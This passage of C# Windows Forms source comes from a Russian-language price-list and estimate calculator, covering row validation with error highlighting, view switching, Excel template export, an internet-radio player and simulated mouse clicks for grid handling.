                        for (int w = 1; w < 8; w++) { dataGridView_расчёт_2[w, q].Style.BackColor = Color.FromArgb(255, 255, 20, 20); }
                        ohibki++;
                        try { ohibki_text = ohibki_text + "\n Порядковый номер: " + dataGridView_расчёт_2.Rows[q].Cells[0].Value.ToString(); } catch { }
                    }
                }
            }



            string ohibka_text2 = "";
            for (int q = 0; q <= dataGridView_расчёт_2.NewRowIndex - 1; q++) // дописать -1
            {
                dialog_mess("Ошибки2?:" + ((q * 100) / dataGridView_расчёт_2.NewRowIndex).ToString());
                int ohi2 = 0;
                for (int s = 0; s <= 3; s++)
                {
                    if (dataGridView_расчёт_2.Rows[q].Cells[s].Value != null) { ohi2++; }
                }


                if (ohi2 != 4)
                {
                    if (ohi2 != 2)
                    {
                        ohibka_text2 = ohibka_text2 + "\nв строке:  " + (q + 1).ToString() + " -много или ничего не заполнено!";
                        for (int w = 1; w < 4; w++) { dataGridView_расчёт_2[w, q].Style.BackColor = Color.FromArgb(255, 255, 255, 20); }
                    }
                    else
                    {
                        for (int w = 0; w < 8; w++) { dataGridView_расчёт_2[w, q].Style.BackColor = Color.PowderBlue; }
                        dataGridView_расчёт_2[10, q].Style.BackColor = Color.PowderBlue;
                    }
                }
                else
                {

                    if (dataGridView_расчёт_2.Rows[q].Cells[7].Value == null)
                    {
                        MessageBox.Show("Ты заполнил все строки до фото,\nВстроке: " + (q + 1).ToString() + " , а вот ни цены ни шт и нет!\n\n Я подсветила это говницо Серым цветом",
                                                       "Вижу говнецо!:",
                                                       MessageBoxButtons.OK,
                                                       MessageBoxIcon.Information
                                                       );
                        for (int w = 1; w < 7; w++) { dataGridView_расчёт_2[w, q].Style.BackColor = Color.FromArgb(255, 100, 100, 100); }
                    }
                }

            }
            if (ohibka_text2 != "")
            {
                MessageBox.Show("Ошибка находится:" + ohibka_text2 + "\n \nНазвание в разделе должно занимать одну ячейку!\nЯ закрасила проблемнуюстрочку желтым цветом! :)\n\n",
                                "Результат поиска ошибок имени раздела:",
                                MessageBoxButtons.OK,
                                MessageBoxIcon.Information
                                //    MessageBoxDefaultButton.Button1,
                                //    MessageBoxOptions.ServiceNotification
                                );
            }



            if (ohibki > 0) { for (int w = 6; w < 8; w++) { dataGridView_расчёт_2[w, dataGridView_расчёт_2.NewRowIndex].Style.BackColor = Color.FromArgb(255, 255, 20, 20); } }
            if (ohibki > 0)
            {
                for (int w = 6; w < 8; w++)
                {
                    dataGridView_расчёт_2[w, dataGridView_расчёт_2.NewRowIndex].Style.BackColor = Color.FromArgb(255, 255, 20, 20);
                    dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[6].Value = "В расчетке";
                    dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[7].Value = "ошибка";
                }

                MessageBox.Show("Ошибки находятся в строках:" + ohibki_text + "\n Я закрасила тебе их красным цветом! :)\n\n",
                       "Результат поиска ошибок в расчетке:",
                       MessageBoxButtons.OK,
                       MessageBoxIcon.Information
                       //    MessageBoxDefaultButton.Button1,
                       //    MessageBoxOptions.ServiceNotification
                       );
            }
            razhet_label.Visible = false;
            label_consol_2.Text = "Расчет закончен. Ошибок: " + ohibki.ToString();
            //проверка имен в начале строки
            no_color_w = false;
            dialog_mess("Stop");
        }


        private void button_Calk_Click(object sender, EventArgs e)
        {
            Process.Start(@"rez\\Calc.exe");
        }


        bool Baza = false;
        private void button_Baza_RACHET_Click(object sender, EventArgs e)
        {
            if (open_window_otchetik == true)
            {
                label_consol.Text = "Там окно поиска открыто!\nЗакрой его.";
                return;
            }

            if (Baza == false)
            { Baza = true; button_Baza_RACHET.Text = "РАСЧЁТ > ПРАЙС"; button_Baza_RACHET.BackColor = Color.LightGreen; groupBox_baza.Visible = false; groupBox_razhet.Visible = true; }
            else { Baza = false; button_Baza_RACHET.Text = "ПРАЙС > РАСЧЁТ"; button_Baza_RACHET.BackColor = Color.LightPink; groupBox_baza.Visible = true; groupBox_razhet.Visible = false; }



            if (Baza == true)
            {
                open_okno = false;
                groupBox_url_praise.Location = new System.Drawing.Point(this.Size.Width + 1, groupBox_url_praise.Location.Y);
            }    
            

        }

        private void получитьЗаготовкуExcelФайлаСФотографиямиДляПереносаToolStripMenuItem_Click(object sender, EventArgs e)
        {



            SaveFileDialog saveFileDialog1 = new SaveFileDialog(); //создание диалогового окна для выбора файла
            saveFileDialog1.Filter = "Екселька + 3 картинки, лучше в пустую папочку (.xlsx)|*.xlsx"; //формат загружаемого файла
            try
            {

                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    string put_k_papke;
                    string put_k_arhiv;

                    //создаем путь для сохранения
                    char[] MyChar = { '.', 'x', 'l', 's', 'x' };
                    string Directory1 = saveFileDialog1.FileName.TrimEnd(MyChar);
                    put_k_papke = Directory1;
                    System.IO.FileInfo obj = new System.IO.FileInfo(saveFileDialog1.FileName); // получаем имя afqkf
                                                                                               //   ActiveForm.Text = obj.Name; //  obj.Name - это имя файла
                    string name_file = obj.Name.TrimEnd(MyChar);// имя файла без пути! 

                    char[] charArr = (name_file).ToCharArray();
                    //   string ddd = filename.TrimEnd(charArr);
                    string pyt_k_file = Directory1.TrimEnd(charArr);
                    put_k_arhiv = pyt_k_file + "1.xlsx";


                    using (ZipFile zip1 = new ZipFile(@"rez\\df._faq"))
                    {

                        try { zip1.ExtractAll(Environment.ExpandEnvironmentVariables(pyt_k_file)); } catch { MessageBox.Show("Наверно нет доступа к папке, куда сохранять!\nЯ сам хрен понял, что произошло."); }
                    }

                    System.IO.File.Move(put_k_arhiv, saveFileDialog1.FileName);

                }

            }
            catch
            {

            }




            string path = "rez\\load__baze.exe.config";
            string[] add = new string[20];
            int a = 0;
            using (StreamReader sr = new StreamReader(path, System.Text.Encoding.Default))
            {
                string line;

                while ((line = sr.ReadLine()) != null)
                {
                    add[a] = line;
                    a++;
                }
            }

        }

        private void button2_Click_1(object sender, EventArgs e)
        {

            string TEMP = Path.GetTempPath();
            Directory.Delete(TEMP + @"\1", true);
        }
        PictureBox pictureBox_Raz1 = new PictureBox();

        private void dataGridView_расчёт_2_CurrentCellChanged(object sender, EventArgs e)
        {
            ///// действие 2

            if (previous_dataGridView_расчёт == true) //поправляем юзера на закарючки
            {
                previous_dataGridView_расчёт = false;
                string f = "";
                try { f = dataGridView_расчёт_2.Rows[previous_dataGridView_расчёт_2_CurrentCell_RowIndex].Cells[5].Value.ToString(); } catch { }
                if (f != "")
                {
                    f = f.Replace(".", ",");
                    string s = f.Substring(0, 1);
                    if (s == ",") { f = "0" + f; }
                    decimal newDecimal;
                    bool isDecimal = Decimal.TryParse(f, out newDecimal);
                    if (newDecimal < 1)
                    { dataGridView_расчёт_2.Rows[previous_dataGridView_расчёт_2_CurrentCell_RowIndex].Cells[5].Value = newDecimal.ToString("#######0.00"); }
                    else
                    { dataGridView_расчёт_2.Rows[previous_dataGridView_расчёт_2_CurrentCell_RowIndex].Cells[5].Value = newDecimal.ToString("########.00"); }
                    if (isDecimal == false) { dataGridView_расчёт_2.Rows[previous_dataGridView_расчёт_2_CurrentCell_RowIndex].Cells[5].Style.BackColor = Color.Red; }
                    else

                    { dataGridView_расчёт_2.Rows[previous_dataGridView_расчёт_2_CurrentCell_RowIndex].Cells[5].Style.BackColor = Color.Empty; }

                }
            }
            try
            {
                if (dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[4].Value != null)
                {

                    try
                    {
                        if (dataGridView_расчёт_2.CurrentCell.RowIndex == dataGridView_расчёт_2.NewRowIndex)
                        {
                            pictureBox_Raz.Image = pictureBox_Raz1.Image;
                            groupBox_картинка_расчетки.Enabled = false;
                        }
                        else
                        {

                            Bitmap fd = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[4].Value as Bitmap;
                            pictureBox_Raz.Image = fd;
                            groupBox_картинка_расчетки.Enabled = true;
                        }

                    }
                    catch { }
                }
                else
                {
                    pictureBox_Raz.Image = pictureBox_Raz1.Image;
                    groupBox_картинка_расчетки.Enabled = false;
                }
            }
            catch { }
            kl++;
            zapret_lohn = true;
            if (otclehivat_polzovatelia == true)
            {
                try
                {
                    dataGridView_муляж.Visible = false;



                    //это избавиться от цвета при выделении зависимости от артикула
                    for (int x = 0; x < dataGridView_расчёт_2.Rows.Count - 1; x++)
                    {
                        try
                        {
                            if (dataGridView_расчёт_2.Rows[x].Cells[3].Style.BackColor == Color.LightGreen) { dataGridView_расчёт_2.Rows[x].Cells[3].Style.BackColor = Color.Empty; }
                        }
                        catch { }
                    }
                    groupBox7.Visible = false;
                    if (dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[8] != null)
                    {//5
                        dataGridView_муляж.Rows.Clear();
                        string dsd = null;
                        try { dsd = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[8].Value.ToString(); } catch { }
                        if (dsd != null)
                        {
                            dataGridView_муляж.Visible = true;
                            groupBox7.Visible = true;
                            int nomber = 1;
                            for (int a = 0; a < dataGridView_зависимость.Rows.Count - 1; a++)
                            {
                                if (dataGridView_зависимость.Rows[a].Cells[4].Value != null && dsd == dataGridView_зависимость.Rows[a].Cells[4].Value.ToString())
                                {
                                    dataGridView_муляж.Rows.Add(nomber.ToString(), dataGridView_зависимость.Rows[a].Cells[0].Value, dataGridView_зависимость.Rows[a].Cells[1].Value, dataGridView_зависимость.Rows[a].Cells[2].Value, dataGridView_зависимость.Rows[a].Cells[3].Value, dataGridView_зависимость.Rows[a].Cells[5].Value);
                                    nomber++;
                                }

                                //05/02/2022  удаление пустой строки
                                if (dataGridView_зависимость.Rows[a].Cells[0].Value == null && dataGridView_зависимость.Rows[a].Cells[1].Value == null && dataGridView_зависимость.Rows[a].Cells[2].Value == null && dataGridView_зависимость.Rows[a].Cells[3].Value == null && dataGridView_зависимость.Rows[a].Cells[4].Value == null)
                                {
                                    dataGridView_зависимость.Rows.RemoveAt(a);
                                }
                                //05/02/2022  удаление пустой строки end
                            }
                        }
                    }
                }
                catch { }
            }
            //узнаем сколько раз надо посчитать! 
            matem_raz = 1; //Если не надо много раз считать тут раскоментировать а ниже гавно закоментируем! 
                           /*
                          if (dataGridView_зависимость.Rows.Count > 0) { 
                          for (int i = 0; i < dataGridView_зависимость.Rows.Count; i++)
                          {
                                  string l = null;
                                  try
                                  {
                                      l = dataGridView_зависимость.Rows[i].Cells[5].Value.ToString();
                                      matem_raz++;
                                  } catch { }
                          }
                          }          
                           */

            математика.Enabled = true;// посчитаем 
            timer1.Enabled = true; // эта херня возращает назад к нужной строке при смене зависимости артикула
        }

        private void pictureBox_Raz_Click(object sender, EventArgs e)
        {

        }

        private void pictureBox_Raz_DoubleClick(object sender, EventArgs e)
        {
            try
            {
                if (dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[4].Value != null)
                {

                    //   try { pictureBox_Raz.Image = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[4].Value as Bitmap; } catch { }

                    // картинка в новом окне!
                    Form form = new Form();
                    form.Icon = System.Drawing.Icon.ExtractAssociatedIcon("ico.ico");   //this.Icon = Properties.Resources.youriconname;
                    PictureBox pictureBox = new PictureBox();
                    pictureBox.Dock = DockStyle.Fill;
                    System.Drawing.Image image1 = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[4].Value as Bitmap;
                    try
                    {
                        int x_высота_экрана = this.Height - 300;

                        if (image1.Width > (x_высота_экрана + 1)) { image1 = new Bitmap(image1, new Size(x_высота_экрана, (x_высота_экрана * image1.Height) / image1.Width)); }
                        else { image1 = new Bitmap(image1, new Size((x_высота_экрана * image1.Width) / image1.Height, x_высота_экрана)); }
                        pictureBox.Image = image1;
                        form.Size = new Size(pictureBox.Image.Size.Width + 10, pictureBox.Image.Size.Height + 40);
                        form.Controls.Add(pictureBox);
                        pictureBox.SizeMode = PictureBoxSizeMode.Zoom;
                        form.StartPosition = FormStartPosition.CenterScreen;
                        form.MinimumSize = new Size(200, 200);
                        form.MaximumSize = form.Size;
                        form.MaximizeBox = false;
                        form.ShowInTaskbar = false;
                        form.ShowDialog();
                    }
                    catch { }
                }
            }
            catch { }
        }

        #region радио плеер

        //Радио:
        private void включитьToolStripMenuItem_Click(object sender, EventArgs e)
        {

            WMPs.PlayStateChange += new WMPLib._WMPOCXEvents_PlayStateChangeEventHandler(wplayer_PlayStateChange);

            string str = "";

            // открываем файл
            using (StreamReader stream = new StreamReader("rez\\radio.txt"))
            {
                while (stream.Peek() >= 0)
                {
                    // читаем строку из файла
                    str = stream.ReadLine();
                }
                stream.Close();
            }

            trackBar1.Enabled = true;
            WMPs.settings.volume = trackBar1.Value;
            try { WMPs.URL = str; } catch { }
            WMPs.controls.play(); //воспроизводим 

            выключитьToolStripMenuItem.Enabled = true;
            включитьToolStripMenuItem.Enabled = false;
            сменитьВолнуToolStripMenuItem.Enabled = true;
            trackBar1.Visible = true;
            trackBar1.Enabled = true;
        }

        private void выключитьToolStripMenuItem_Click(object sender, EventArgs e)
        {
            WMPs.controls.stop();
            trackBar1.Enabled = false;
            trackBar1.Visible = false;
            WMPs.controls.stop();
            выключитьToolStripMenuItem.Enabled = false;
            включитьToolStripMenuItem.Enabled = true;
            сменитьВолнуToolStripMenuItem.Enabled = false;

        }

        private void сменитьВолнуToolStripMenuItem_Click(object sender, EventArgs e)
        {

            string str = "";
            // открываем файл
            using (StreamReader stream = new StreamReader("rez\\radio.txt"))
            {
                while (stream.Peek() >= 0)
                {
                    // читаем строку из файла
                    str = stream.ReadLine();
                }
                stream.Close();
            }



            string result = Microsoft.VisualBasic.Interaction.InputBox("Вы решили сменить пластинку\nТекущая: " + str + "\nВведите ссылку на новую:", "Окно ввода нового источника");
            if (result != "")//если пользователь, что то родил в строку.
            {
                try
                {
                    FileStream fileStream = File.Open("rez\\radio.txt", FileMode.Create);
                    // получаем поток
                    StreamWriter output = new StreamWriter(fileStream);
                    // записываем текст в поток
                    output.Write(result);
                    // закрываем поток
                    output.Close();
                }
                catch { }
                WMPs.controls.stop(); //воспроизводим 
                try { WMPs.URL = result; } catch { }
                WMPs.controls.play();

            }
            trackBar1.Visible = true;
            trackBar1.Enabled = true;

        }

        private void найтиДрстанцииToolStripMenuItem_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("rez\\radio_url.txt");
        }

        WindowsMediaPlayer WMPs = new WMPLib.WindowsMediaPlayer(); //создаётся плеер 
        void wplayer_PlayStateChange(int NewState)
        {
            if (NewState == (int)WMPLib.WMPPlayState.wmppsMediaEnded)
            {
                WMPs.controls.currentPosition = 0;
            }
        }

        private void trackBar1_Scroll(object sender, EventArgs e)
        {
            WMPs.settings.volume = trackBar1.Value;
        }

        private void button2_Click_2(object sender, EventArgs e)
        {
            try
            {
                dataGridView_расчёт_2.Rows.Insert(dataGridView_расчёт_2.CurrentCell.RowIndex, 1);

                int df = ((int)numericUpDown2.Value) - 1;

                //загоняем в предыдущую надпись
                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex - 1].Cells[df].Value = textBox_new_stolbeth.Text;
                dataGridView_расчёт_2.CurrentCell = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex - 1].Cells[0];
                if (checkBox3.Checked == true) { dataGridView_расчёт_2.CurrentCell = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex + 1].Cells[0]; }// переместим курсор в под неё //ниже перейти?

                for (int i = 0; i < 8; i++)
                {
                    dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[i].Style.BackColor = Color.PowderBlue;
                }
                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[10].Style.BackColor = Color.PowderBlue;
                razhet_label.Visible = true;//требуется расчёт
                label_consol_2.Text = "Дабавлен новый раздел: " + textBox_new_stolbeth.Text + "         Всего строк: " + dataGridView_расчёт_2.NewRowIndex.ToString();
            }
            catch
            {
                MessageBox.Show("Маркер в первой строке, над текущей низя!");

            }

        }

        private void button3_Click(object sender, EventArgs e)
        {
            string nomber = "1";
            if (dataGridView_зависимость.Rows.Count > 0)
            {
                nomber = (dataGridView_зависимость.Rows.Count + 1).ToString();
            }
            else
            {
            }
            if (dataGridView_муляж.Enabled == true)
            {
                dataGridView_муляж.Rows.Add(nomber, "1", null, "x", "1");
            }
            dataGridView_муляж_CellValidated(null, null);
            kl = 0;



        }


        //Радио end
        #endregion радио плеер
        private void comboBox_елупни_SelectedIndexChanged(object sender, EventArgs e)
        {

            bool isDecimal = Decimal.TryParse(settlement_price[comboBox_елупни.SelectedIndex + 16], out koff_klienty);
            label18.Text = koff_klienty.ToString();

            string[] data = new string[46];
            using (StreamReader stream = new StreamReader("settlement.dll"))
            {
                string str = "";
                int x = 0;
                while (stream.Peek() >= 0)
                {
                    // читаем строку из файла
                    str = stream.ReadLine();
                    try { data[x] = str; } catch { label_consol.Text = "Файл данных о коэффициентах для переноса цен поврежден!"; }
                    x++;
                }
                stream.Close();
                razhet_label.Visible = true;
            }

            try
            {
                data[0] = comboBox_елупни.SelectedIndex.ToString();
                FileStream fileStream = File.Open("settlement.dll", FileMode.Create);
                // получаем поток
                StreamWriter output = new StreamWriter(fileStream);
                for (int x = 0; x < 46; x++)
                {
                    if (x < 45) output.Write(data[x] + "\n");
                    if (x == 45) output.Write(data[x]);
                }
                // закрываем поток
                output.Close();
                
            }
            catch { }
        }



        public void save_managers()
        {

            int ee = comboBox_елупни.SelectedIndex;
            comboBox_елупни.Items.Clear();

            string str = "";
            // открываем файл
            settlement_price = null;
            settlement_price = new string[46];

            using (StreamReader stream = new StreamReader("settlement_price.faq"))
            {
                int x = 0;
                while (stream.Peek() >= 0)
                {
                    // читаем строку из файла
                    str = stream.ReadLine();
                    try { settlement_price[x] = str; } catch { label_consol.Text = "Файл данных о коэффициентах для переноса цен поврежден!"; }
                    x++;
                }
                stream.Close();
            }
            try
            {
                for (int x = 1; x < 16; x++)
                {

                    comboBox_елупни.Items.Add(settlement_price[x]);

                }

                comboBox_елупни.SelectedIndex = int.Parse(settlement_price[0]);
                bool isDecimal = Decimal.TryParse(settlement_price[comboBox_елупни.SelectedIndex + 16], out koff_klienty);
                label18.Text = koff_klienty.ToString();
            }
            catch { label_consol.Text = "Файл данных о коэффициентах для переноса цен поврежден!"; }
        }



        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            MessageBox.Show("В этой кнопке шарится программист. Скоро она изменится!, Я сама хрен поняла, что произошло. Не пугася");
        }

        private void button_поиск_Click(object sender, EventArgs e)
        {

            checkBox2.Visible = true;
            button_поиск_копий_в_базе.Visible = true;


            button_добавить.Enabled = true;
            button_поиск.Enabled = false;
            groupBox_поиск.Visible = true;
            groupBox_добавить.Visible = false;

            //обновим поиск
            // загоним списокс базы. в это окно

            // 1) слижем все данные с графы производитель
            comboBox1_поиск.Items.Clear(); //чистим список 1

            naimen_proizvoditel_FULL = new string[this.tableBindingSource.Count];
            naimen_naimenovania_FULL = new string[this.tableBindingSource.Count];
            naimen_артикул_FULL = new string[this.tableBindingSource.Count];
            naimen_цена_FULL = new string[this.tableBindingSource.Count];
            for (int a = 0; a < this.tableBindingSource.Count; a++)
            {
                naimen_proizvoditel_FULL[a] = tableDataGridView[1, a].Value.ToString();
                naimen_naimenovania_FULL[a] = tableDataGridView[2, a].Value.ToString();
                naimen_артикул_FULL[a] = tableDataGridView[3, a].Value.ToString();
                naimen_цена_FULL[a] = tableDataGridView[5, a].Value.ToString();
            }

            // уберем повторы из списка производителя
            naimen_proizvoditel = naimen_proizvoditel_FULL.Distinct().ToArray();

            массив_производителей = new string[naimen_proizvoditel.Count()][]; //присвоили 3 ячейки из списка
            массив_наименования = new string[naimen_proizvoditel.Count()][];
            массив_артикул = new string[naimen_proizvoditel.Count()][];
            массив_цена = new string[naimen_цена_FULL.Count()][];


            for (int x = 0; x < naimen_proizvoditel.Count(); x++) //3 in
            {
                int k = 0;
                for (int y = 0; y < naimen_proizvoditel_FULL.Count(); y++) // 8 in
                {
                    if (naimen_proizvoditel_FULL[y] == naimen_proizvoditel[x]) { k++; }
                }
                массив_производителей[x] = new string[k];
                массив_наименования[x] = new string[k];
                массив_артикул[x] = new string[k];
                массив_цена[x] = new string[k];

            }

            for (int z = 0; z < naimen_proizvoditel.Count(); z++) // 3 in
            {
                int q = 0;
                for (int y = 0; y < naimen_proizvoditel_FULL.Count(); y++) // 8 in
                {


                    if (naimen_proizvoditel_FULL[y] == naimen_proizvoditel[z])
                    {

                        массив_производителей[z][q] = naimen_proizvoditel_FULL[y];
                        массив_наименования[z][q] = naimen_naimenovania_FULL[y];
                        массив_артикул[z][q] = naimen_артикул_FULL[y];
                        массив_цена[z][q] = naimen_цена_FULL[y];
                        q++;
                    }
                }




            }

            comboBox1_поиск.Items.AddRange(naimen_proizvoditel);
            try { comboBox1_поиск.SelectedIndex = 0; } catch { label_consol.Text = "Неудачное подключение к прайсу!"; }



        }

        private void button_добавить_Click(object sender, EventArgs e)
        {
            if (open_window_otchetik == true)
            {
                label_consol.Text = "Там редактор повторов открыт! Закрой его.";
                return;
            }
            button_поиск.Enabled = true;
            button_добавить.Enabled = false;
            groupBox_поиск.Visible = false;
            groupBox_добавить.Visible = true;

            checkBox2.Visible = false;
            button_поиск_копий_в_базе.Visible = false;
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (open_window_otchetik == true)
            {
                label_consol.Text = "Там редактор повторов открыт! Закрой его.";
                return;
            }
        }

        private void фотографияPictureBox_Click(object sender, EventArgs e)
        {

        }

        private void pictureBox_new_image_Click(object sender, EventArgs e)
        {

        }


        //===========================================
        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, UIntPtr dwExtraInfo);

        [Flags]
        public enum MouseEventFlags : uint
        {
            LEFTDOWN = 0x00000002,
            LEFTUP = 0x00000004,
            MIDDLEDOWN = 0x00000020,
            MIDDLEUP = 0x00000040,
            MOVE = 0x00000001,
            ABSOLUTE = 0x00008000,
            RIGHTDOWN = 0x00000008,
            RIGHTUP = 0x00000010
        }
        //===========================================
        public void DoMouseClick(uint X, uint Y)
        {
            mouse_event((uint)(MouseEventFlags.LEFTDOWN | MouseEventFlags.LEFTUP), X, Y, 0, UIntPtr.Zero);



        }




        private void timer_dual_mouse_Tick(object sender, EventArgs e)
        {
            timer_dual_mouse.Enabled = false;



            try
            {

                int selectedRowCount = tableDataGridView.Rows.GetRowCount(DataGridViewElementStates.Selected); ;


                //    selectedRowCount == 0- это любая ячейка, 1 - это стрелочка
                if (selectedRowCount == 0 || selectedRowCount == 1)
                {
                    dataGridView_расчёт_2.Rows.Insert(dataGridView_расчёт_2.CurrentCell.RowIndex + 1, 1); //дабавить под выделенной строкой

                    // dataGridView_Заказ.Rows.Add();

                    // текст перенос
                    dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex + 1].Cells[1].Value = производительTextBox.Text;
                    dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex + 1].Cells[2].Value = наименованиеTextBox.Text;
                    dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex + 1].Cells[3].Value = артикулTextBox.Text;


                    // режим цену
                    string цена_урезанная = "0.00";
                    if (ценаTextBox.TextLength > 0)
                    {
                        цена_урезанная = ценаTextBox.Text.Substring(0, (ценаTextBox.TextLength - 2));
                    }
                    else
                    {
                        MessageBox.Show("В значение нет числа! Или оно кривое! Впиши в ручную! Или исправь в базе");
                    }


                    dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex + 1].Cells[5].Value = цена_урезанная;
                    //FOTO
                    dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex + 1].Cells[4].Value = фотографияPictureBox.Image;
                    //колличество + посчитать сумарно+вывести в последнюю
                    dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex + 1].Cells[6].Value = numericUpDown3.Value;
                    decimal newDecimal;
                    bool isDecimal = Decimal.TryParse(ценаTextBox.Text.ToString(), out newDecimal);
                    string twoDecimalPlaces = (newDecimal * numericUpDown3.Value).ToString("########.00");
                    if (newDecimal < 1) { twoDecimalPlaces = "0" + twoDecimalPlaces; }
                    dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex + 1].Cells[7].Value = twoDecimalPlaces;

                    label_consol.Text = "Эта страка добавлена в расчёт!";
                    label_consol.Text = "Строка: " + (tableDataGridView.CurrentRow.Index + 1).ToString() + " прайса добавлена под:" + dataGridView_расчёт_2.NewRowIndex.ToString() + " в расчёте.";
                    label_consol_2.Text = "Добавлено с базы под выбранной стракой!" + "         Всего строк: " + dataGridView_расчёт_2.NewRowIndex.ToString();
                    dataGridView_расчёт_2.CurrentCell = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex + 1].Cells[0];// переместим курсор в под неё 




                    label_добавленно.Text = "Добавлено!";
                    label_добавленно.Visible = true;

                    timer_labe_добавленна.Enabled = true;
                }
            }
            catch
            {

                label_добавленно.Text = "Неа. Создай раздел!";
                label_добавленно.Visible = true;
                timer_labe_добавленна.Enabled = true;
                label_consol.Text = "Неа! Нужно создать раздел в расчёте!";
                label_consol_2.Text = "Хрен Вам!. Нужна хоть она созданная строка! Или у тя где-то в ячейках прайса ошибки в числах! Проверь цифры!! Перезагрузи прайс";
            }

        }




        private void tableDataGridView_DoubleClick(object sender, EventArgs e)
        {
            if (press_mouse_righ == true)
            {
                //Вызов импортируемой функции с текущей позиции курсора
                uint X = (uint)Cursor.Position.X;
                uint Y = (uint)Cursor.Position.Y;
                DoMouseClick(X, Y);
                press_mouse_righ = false;
                if (button_поиск.Enabled == true)
                {
                    int x = tableDataGridView.CurrentCell.RowIndex;
                    int y = tableDataGridView.CurrentCell.ColumnIndex;
                    button_поиск.PerformClick();
                    tableDataGridView.CurrentCell = tableDataGridView.Rows[x].Cells[y];
                }
                timer_dual_mouse.Enabled = true;
                razhet_label.Visible = true;
            }
        }


        Boolean exet = false;
        private void Form1_FormClosing_1(object sender, FormClosingEventArgs e)
        {
            if (rezult_nuhna_li_bez_praisa != DialogResult.No)
            {
                if (exet == false)
                {
                    if (nyna_update == true) //програмно решили обновиться! 
                    {
                        e.Cancel = false;
                    }
                    else
                    {
                        if (MessageBox.Show("?Давай, до свидания \n   Коля(ing@slpk.by)", "Юзер решил покинуть нас! ", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button1, MessageBoxOptions.RtlReading) == System.Windows.Forms.DialogResult.No)
                            e.Cancel = true;
                        else
                            e.Cancel = false;
                    }
                }
            }


        }

        private void timer_labe_добавленна_Tick(object sender, EventArgs e)
        {

            label_добавленно.Visible = false;
            timer_labe_добавленна.Enabled = false;
        }

        private void dataGridView_расчёт_2_Validated(object sender, EventArgs e)
        {
        }
        private void радиоToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }
        private void dataGridView_расчёт_2_RowEnter(object sender, DataGridViewCellEventArgs e)
        {
        }

        # region шаблоны

        public void вРазработкеСоздатьШаблонToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (Baza == false)
            { Baza = true; button_Baza_RACHET.Text = "РАСЧЁТ > ПРАЙС"; button_Baza_RACHET.BackColor = Color.LightGreen; groupBox_baza.Visible = false; groupBox_razhet.Visible = true; }

            open_okno = false;
            groupBox_url_praise.Location = new System.Drawing.Point(this.Size.Width + 1, groupBox_url_praise.Location.Y);

            создать_шаблон вы = new создать_шаблон();
            вы.ShowDialog();
        }
        //отправить в базу шаблон.
        public string имя_файла = "";
        public Boolean erore_создания = false;
        public bool создала_шаблон = false;
        public void button_создать_шаблон_Click(object sender, EventArgs e)
        {
            if (имя_файла != "")
            {
                // это ошибка для другой формы. erore_создания = true;
                // тело сохранения            
                otclehivat_polzovatelia = false;
                label_consol_2.Text = "Попытка сохранить данные с таблицы в шаблон.. :)";
                if (dataGridView_расчёт_2.NewRowIndex == 0)
                {
                    MessageBox.Show("Там нихрена нет!", "Шутник Вы однако");
                    erore_создания = true;
                }
                else
                {
                    if (dataGridView_расчёт_2.NewRowIndex == 1)
                    { label_consol_2.Text = "Запомни в уме! :) Запиши на листик!"; MessageBox.Show("Маловато будет! Маловато!", "НеТ!"); erore_создания = true; }
                    else
                    {
                        label_consol_2.Text = "Cоздание файла...";
                        string Directory2 = Environment.CurrentDirectory + "\\rez\\CNDataTemp\\" + имя_файла;
                        //string TEMP = Path.GetTempPath(); // темп винды
                        try
                        {
                            // получаем выбранный файл
                            string filename = Directory2;
                            System.IO.FileInfo obj = new System.IO.FileInfo(Directory2); // получаем имя              
                            int y = filename.Length - 4;
                            string Directory1 = filename.Remove(y, 4); // путь к папке                    
                            System.IO.Directory.CreateDirectory(Directory1); // создаем папку! с именем файла
                            string name_file = System.IO.Path.GetFileNameWithoutExtension(filename);// имя файла без пути! 
                            string name_file_put = Directory1 + "\\" + obj.Name;
                            string name_file_zav = Directory1 + "\\_" + obj.Name;
                            //Примечание
                            string name_file_PS = Directory1 + "\\_PS_" + obj.Name;
                            try
                            {
                                // System.IO.File.Create(name_file_PS);
                                FileStream fileStream = File.Open(name_file_PS, FileMode.Create);
                                // получаем поток
                                StreamWriter output = new StreamWriter(fileStream);
                                // записываем текст в поток
